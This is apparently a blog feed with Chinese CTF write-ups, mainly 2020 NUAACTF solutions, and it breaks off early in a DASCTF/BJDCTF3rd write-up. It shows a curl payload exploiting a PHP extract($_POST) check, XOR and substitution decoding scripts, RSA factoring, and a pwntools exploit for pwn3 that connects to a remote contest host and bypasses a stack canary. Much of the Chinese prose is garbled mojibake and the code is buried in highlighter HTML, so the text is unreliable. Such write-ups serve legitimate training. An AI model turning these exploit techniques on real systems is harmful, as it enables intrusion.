punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #007700</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>)<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>{<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #0000BB</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>extract<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #007700</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>(<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #0000BB</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>$_POST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #007700</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>);<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>if<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>(<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #0000BB</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>$pass<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #007700</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>==<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #0000BB</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>$newpass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #007700</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>)<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>{<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>echo<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #0000BB</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>$flag<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #007700</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #0000BB</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>highlight_file<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #007700</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>(<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #0000BB</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>__FILE__<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #007700</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>);<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">&gt;</span></span></code></pre><p>ä¼ å…¥ä¸¤ä¸ªå‚æ•°<code>pass</code>å’Œ<code>newpass</code>ï¼Œè®©å®ƒä¿©çš„å€¼ç›¸ç­‰å°±è¡Œäº†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">./curl -v https://106.14.153.173:8443/check.php --http3 -d <span class="token string">"pass=1&amp;newpass=1"</span></code></pre><p>ç„¶åå¾—åˆ°flagï¼š</p><p><code>NUAACTF{WH4T_d0_y0u_kn0w_H334}</code></p><h4 id="å¦ä¸€ç§-curl-æ–¹æ³•"><a href="#å¦ä¸€ç§-curl-æ–¹æ³•" class="headerlink" title="å¦ä¸€ç§ curl æ–¹æ³•"></a>å¦ä¸€ç§ curl æ–¹æ³•</h4><p>æƒ³åˆ°ä¸€ä¸ªæ–¹æ¡ˆï¼Œå°±æ˜¯ç›´æ¥æ‹‰åˆ«äººæ„å»ºå¥½çš„ docker é•œåƒã€‚</p><p>æ‰¾åˆ°äº†ä¸€ä¸ª build æœ‰ HTTP3 çš„ curl docker imageï¼š<strong>ymuski/curl-http3</strong></p><blockquote><p>Docker image of <code>curl</code> compiled with  <code>BoringSSL</code> and <code>quiche/0.2.0</code> for <strong>HTTP3 support</strong>, <code>httpstat</code> for visualization.</p><p>GitHub ä»“åº“ï¼š**<a href="https://github.com/yurymuski/curl-http3">curl-http3</a>**</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker run -it --rm ymuski/curl-http3 curl -V</span><span class="token function">curl</span> <span class="token number">7.71</span>.0-DEV <span class="token punctuation">(</span>x86_64-pc-linux-gnu<span class="token punctuation">)</span> libcurl/7.71.0-DEV BoringSSL quiche/0.4.0Release-Date: <span class="token punctuation">[</span>unreleased<span class="token punctuation">]</span>Protocols: dict <span class="token function">file</span> <span class="token function">ftp</span> ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftpFeatures: alt-svc AsynchDNS HTTP3 HTTPS-proxy IPv6 Largefile NTLM NTLM_WB SSL UnixSockets</code></pre><p>è€Œåç›´æ¥åšé¢˜å°±å®Œäº‹äº†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker run -it --rm ymuski/curl-http3 <span class="token function">curl</span> -Lv https://106.14.153.173:8443/check.php --http3 -d <span class="token string">"pass=a&amp;newpass=a"</span></code></pre><br><hr><h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="rev1-xor"><a href="#rev1-xor" class="headerlink" title="rev1-xor"></a>rev1-xor</h3><p>pyc åç¼–è¯‘ï¼ˆå¯ä»¥åˆ©ç”¨<a href="https://tool.lu/pyc/">è¿™ä¸ªå·¥å…·</a>ï¼‰</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flag <span class="token keyword">import</span> flags <span class="token operator">=</span> <span class="token string">'qwertyuiopasdfghjklzxcvbnm1234567890'</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token operator">**</span><span class="token boolean">None</span><span class="token punctuation">)</span></code></pre><p>å“‡å‘œï¼Œæœ€ç®€å•çš„å¼‚æˆ–ï¼Œç›´æ¥å¼‚æˆ–å›å»å°±å®Œäº‹äº†ã€‚</p><p><strong>Exp:</strong></p><pre class="language-python" data-language="python"><code class="language-python">encrypted <span class="token operator">=</span> <span class="token string">"31 2 4 19 23 13 19 18 24 31 22 44 29 9 18 55 9 10 2 37 10 6 23 14 2 20 110 86 82 90 86 83 74"</span>s <span class="token operator">=</span> <span class="token string">'qwertyuiopasdfghjklzxcvbnm1234567890'</span>m <span class="token operator">=</span> encrypted<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> m<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530132410728.png" alt="re1"></p><p><code>nuaactf{wow_you_can_really_dance}</code></p><h3 id="rev2-demium"><a href="#rev2-demium" class="headerlink" title="rev2-demium"></a>rev2-demium</h3><blockquote><p>encryptæ˜¯flagç”¨mediumåŠ å¯†æ¥çš„ï¼Œå°è¯•é€†å‘å®ƒå§</p></blockquote><p>çœ‹äº†çœ‹é€†å‘ï¼Œå¥½åƒæœ‰ç‚¹å¤æ‚ã€‚</p><p>è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°<code>flag</code>å’Œ<code>encrypt.txt</code>ä¸­çš„å¤´4ä¸ªå­—æ¯å¯¹åº”çš„ã€‚äºæ˜¯ç›´æ¥å€Ÿç”¨è¿™ä¸ªç¨‹åºå»ºç«‹ä¸€ä¸ªå¯†ç æ˜ å°„å…³ç³»å°±å®Œäº‹äº†ã€‚</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530135109666.png" alt="re2-1"></p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530135033544.png" alt="re2-2"></p><p>python å†™ä¸€æ³¢jioæœ¬ã€‚</p><p><strong>Expï¼š</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span>m <span class="token operator">=</span> <span class="token string">r"W1og39p2Kp+2_Zpx2{/yF"</span>s <span class="token operator">=</span> <span class="token string">r"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=!@#$%^&amp;*()_+"</span>e <span class="token operator">=</span> <span class="token string">r"oLlQfWgThE_1-ZpsUHMS+ex6K\tP{9I}Jn8C4/kmcd5yBAz0RDaVrwuGvNjqOYi===========2b"</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> m<span class="token punctuation">:</span>    index <span class="token operator">=</span> e<span class="token punctuation">.</span>find<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token comment"># print(e.find(i))</span>    <span class="token keyword">if</span> index <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>        single <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span>        <span class="token comment"># print(single)</span>        flag <span class="token operator">+=</span> single<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># flagDo_you_know_CLR</span></code></pre><p><em>ï¼ˆexpä¸­æ²¡æœ‰å†™<code>{</code> <code>}</code>çš„å¯¹åº”å…³ç³»ï¼Œé—®é¢˜ä¸å¤§</em></p><p>å¾—åˆ° flag:</p><p><code>flag{Do_you_know_CLR}</code></p><br><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto1-è´æ–¯"><a href="#Crypto1-è´æ–¯" class="headerlink" title="Crypto1-è´æ–¯"></a>Crypto1-è´æ–¯</h3><p>base64 ä¸€æ³¢å®Œäº‹</p><h3 id="crypto4-RREAL-RSA"><a href="#crypto4-RREAL-RSA" class="headerlink" title="crypto4-RREAL_RSA"></a>crypto4-RREAL_RSA</h3><p>å“‡å‘œï¼Œæœ‰ç›´æ¥äº†å½“çš„ RSAï¼</p><pre class="language-none"><code class="language-none">Public key:e=65537, n=1106081963347301781444155926534938643298217639670251381867474826890728970307Encrypted flag:c=681873475888907291485502809441689140305197371659486141705279050132490452420</code></pre><p>å¤§æ•´æ•°Nåˆ†è§£å¾—åˆ°ä¸¤ä¸ªè´¨æ•°ï¼š</p><p>6598638704725743849027686163703739789</p><p>167622749606696848477732277529837832463</p><blockquote><p>æœ¬åœ°è·‘äº†åŠå¤©æ²¡è·‘å‡ºæ¥ï¼Œæ‹¿å» <a href="http://factordb.com/">http://factordb.com/</a> è¿™é‡Œåˆ†è§£å°±å¥½äº†ã€‚</p></blockquote><p>è®¡ç®—Då†è§£å¯†Cå³å¯å¾—åˆ°flag</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530140248121.png" alt="crypto4"></p><p><code>flag{Here_Is_R4a1_Rs@}</code></p><br><hr><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>æŒ‰åˆ˜å¸ˆå‚…æ„æ€ï¼Œæœç„¶æœ‰ç­¾åˆ°é¢˜ã€‚</p><p>ç›´æ¥ncå°±å‡ºæ¥äº†</p><p><img src="/2020/05/30/CTF_2020NUAACTF/pwn1.png" alt="pwn1"></p><h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>æ”¹<code>v2</code>ç»•è¿‡ cannary</p><p>æŠŠ<code>v2</code>æ”¹æˆ 0x40</p><p><img src="/2020/05/30/CTF_2020NUAACTF/pwn3-1.png" alt="pwn3-1"></p><p><img src="/2020/05/30/CTF_2020NUAACTF/pwn3-2.png" alt="pwn3-2"></p><p><img src="/2020/05/30/CTF_2020NUAACTF/pwn3-3.png" alt="pwn3-3"></p><p><strong>Exp:</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>c <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'49.235.243.206'</span><span class="token punctuation">,</span> <span class="token number">10503</span><span class="token punctuation">)</span><span class="token comment">#c = process('./33')</span><span class="token comment">#gdb.attach(c)</span>sysaddr <span class="token operator">=</span> <span class="token number">0x004007FB</span>payload <span class="token operator">=</span> <span class="token string">''</span>payload <span class="token operator">+=</span>p64<span class="token punctuation">(</span>sysaddr<span class="token punctuation">)</span>c<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>c<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530203847885.png" alt="pwn3-flag"></p><br><hr><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å…¶å®ç°åœ¨æ„Ÿè§‰åšå‡ºæ¥çš„é¢˜ç›®è¿˜ç®—å¾ˆå¸¸è§„çš„ï¼Œå¤§éƒ½æ˜¯å¸¸ç”¨çš„å¥—è·¯ç½¢äº†ã€‚</p><p>æ¯•ç«Ÿæ˜¯æ ¡èµ›ï¼Œæœ¬èº«æ ¡å†…ç©è¿™ä¸ªçš„ä¹Ÿä¸å¤šï¼Œé¢˜ç›®çš„è¯è‡ªç„¶ç›¸å¯¹äºå¤–é¢è€Œè¨€å‹å¥½å¤šäº†ã€‚</p><p>ä¸è¿‡è¯è¯´å›æ¥ï¼Œè¿™æ¬¡æ¯”èµ›éš¾åº¦ç¨å¤§çš„é¢˜ç›®è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œç”šè‡³ç½‘ä¸Šè¿˜æ²¡æœ‰è¿‡ç›¸å…³çš„æ€è·¯ï¼Œå‡ºé¢˜å¸ˆå‚…ä»¬ä¹ŸæŒºè´¹å¿ƒè¡€äº†ã€‚</p><p>æœ‰çš„é¢˜ç›®æœ‰äº†æ€è·¯ï¼Œç°åœºæŸ¥äº†åŠå¤©èµ„æ–™è¿˜åšä¸å‡º flag æ¥ï¼Œè¿™æ—¶å€™å°±æŒºç»æœ›çš„ã€‚</p><p><del>ï¼ˆè¿˜æœ‰æ¯”å¦‚ä¸ºäº†ä¸€ä¸ªé¢˜ç”¨ http3 è£…äº†å‡ ä¸ªå°æ—¶ curl åˆ°æ¯”èµ›ç»“æŸéƒ½æ²¡è£…ä¸Šï¼Œä»£ç åŠå¤©æ‹‰ä¸ä¸‹æ¥æ°”æ­»æˆ‘äº†</del></p><p>è¿˜è¦æ„Ÿè°¢é˜Ÿå‹ä¸€èµ·å†²å‘€ï¼ä¹Ÿç®—æ˜¯ä¸€ä¸ªå°å¿ƒæ„¿å®ç°äº†å§å˜»å˜»å˜»ã€‚</p><p>å¯èƒ½è¿™å°±æ˜¯ CTF çš„é­…åŠ›å§ã€‚</p><p>å°±å…ˆè¿™æ ·äº†8ï¼Œåé¢æœ‰ç©ºå†æ¥å¤ç°å–µ~</p><p>ï¼ˆæºœäº†å–µ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | DASCTF May &amp; BJDCTF3rd éƒ¨åˆ†WriteUp</title>
      <link href="2020/05/24/CTF_BJDCTF3rd/"/>
      <url>2020/05/24/CTF_BJDCTF3rd/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p><img src="/2020/05/24/CTF_BJDCTF3rd/poster.jpg" alt="poster"></p><p>å“‡å‘œï¼Œè½¬çœ¼é—´ä¸€ä¸ªæœˆåˆè¿‡å»äº†ã€‚è¿™ä¸ªæœˆäº‹æƒ…æŒºå¤šçš„ï¼Œå½“ç„¶ä¹Ÿæ¯”è¾ƒæ‡’ï¼Œä¸€ç›´å’•ç€æ²¡æ¥æ›´æ–°åšå®¢ã€‚</p><p>å‰ä¸¤å¤©æ°´äº†ä¸€ä¸‹ DASCTF äº”æœˆèµ› &amp; BJDCTF3rdï¼Œè¿™æ¬¡ä¸æ˜¯æ–°ç”Ÿèµ›äº†ï¼Œè¿˜æ˜¯å’Œä¼ä¸šåˆåŠçš„ï¼Œäºæ˜¯éš¾åº¦å¤§çš„äºšæ‰¹ï¼Œæ‰“å¾—éƒ½è‡ªé—­äº†ã€‚ï¼ˆæ²¡ç†ç”±å¹æ–°ç”Ÿèµ›äº†å˜¤å˜¤å˜¤ã€‚</p><p>æœ‰ä¸€ç§å¥½ä¹…æ²¡æ‰“ CTF çš„æ„Ÿè§‰ï¼Œè¿™æ¬¡ä¸Šæ‰‹æŒºç”Ÿç–çš„ï¼ˆï¼Ÿ</p><p>é¢˜ç›®çœ‹ä¸Šå»æŒºå¤šçš„ï¼Œç¡®å®ä¹Ÿæ˜¯ï¼Œç„¶è€Œå°±ä¸æ€ä¹ˆä¼šåšå˜›ã€‚ï¼ˆæ‘Šæ‰‹</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/8VHqaqGQuOoT84iw.png" alt="é¢˜ç›®"></p><p>å®˜æ–¹é—®é¢˜æ±‡æ€»æ–‡æ¡£<a href="https://shimo.im/docs/KJypgTpQgRdxQ6tY/read">è§è¿™é‡Œ</a>ã€‚ï¼ˆåŒ…æ‹¬ hint ç­‰ï¼‰</p><p>è¿™æ¬¡ä¸»è¦æ¥çœ‹çœ‹ Misc é¢˜å§ï¼Œå…¶ä»–çš„éšæ„çœ‹çœ‹å¥½äº†ã€‚<small><del>ï¼ˆåæ­£ä¹Ÿä¸ä¼šåš</del></small></p><p>æ¯”èµ›ç»“æŸåé¢˜ç›®ç¯å¢ƒå·²ç»å…³äº†ï¼Œéšä¾¿å†™å†™8.</p><br><hr><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="blink"><a href="#blink" class="headerlink" title="blink"></a>blink</h3><blockquote><p>ä¸€é—ªä¸€é—ªäº®æ™¶æ™¶~(è¯·å°†flagç»è¿‡md5åæäº¤) </p><p>hint1: å®Œæ•´çš„å›¾æ¡ˆå¯ä»¥æ‰«ä¸€æ‰« </p><p>hint2: <a href="http://taqini.space/2020/04/30/shell-output-control-code">http://taqini.space/2020/04/30/shell-output-control-code</a></p><p>hint3: æ­¤é¢˜æœ‰å¤šç§è§£æ³•ï¼Œä¸ä¸€å®šè¦ç¡¬æŠŠflagé€†å‡ºæ¥</p></blockquote><p>è¿™é¢˜æœ¬æ¥æ˜¯æƒ³é€†å‘è§£çš„ï¼Œå°±æ˜¯ä»–ç”¨äº†ä¸å°‘è¾“å‡ºæ§åˆ¶ç ï¼Œçœ‹äº†ä¸€ä¸‹æŒºå¤æ‚çš„ã€‚</p><p>å¯ä»¥æ‰«ä¸€æ‰«ï¼Œæ˜ç¡®å°±æ˜¯äºŒç»´ç ä¹‹ç±»çš„äº†ã€‚</p><p>ä¸€é—ªä¸€é—ªçš„ï¼Œçªç„¶æƒ³åˆ°æˆªå›¾ç„¶åå åŠ å°±å¥½äº†å‘€ï¼</p><p>æ–­å¼€è¿æ¥åå†ä¸€çœ‹ï¼Œä»–çš„å®ç°æ˜¯ä¸€å±ä¸€å±åˆ·çš„ï¼Œæ¯ä¸€æ¬¡è®°å½•éƒ½ä¿ç•™åœ¨ç»ˆç«¯é‡Œï¼Œ<strong>ç›´æ¥ç»ˆç«¯é‡Œå¤åˆ¶ç»“æœï¼Œå†å†™ä¸ª jio æœ¬å°±å¥½äº†å‘€ï¼</strong></p><p><strong>Expï¼š</strong></p><p>pythonå¤§æ³•å¥½å‘€ï¼</p><p>æˆ‘è¿™é‡Œåˆ†åˆ«å¤åˆ¶äº†10æ¬¡é—ªçƒçš„ç»“æœåˆ°æ–‡ä»¶é‡Œï¼Œè€ƒè™‘10æ¬¡åº”è¯¥å¤Ÿäº†ã€‚</p><p>å›¾å½¢æ˜¯25*25çš„ï¼Œç”¨ä¸€ä¸ªçŸ©é˜µæ¥å­˜æ˜¯0è¿˜æ˜¯1.</p><p>ä¹‹åå†è½¬æ¢åˆ° [0, 255] uint8 ç±»å‹ï¼Œç”¨ PIL ä½œå›¾å¥½äº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> numpy <span class="token keyword">as</span> nptable <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token 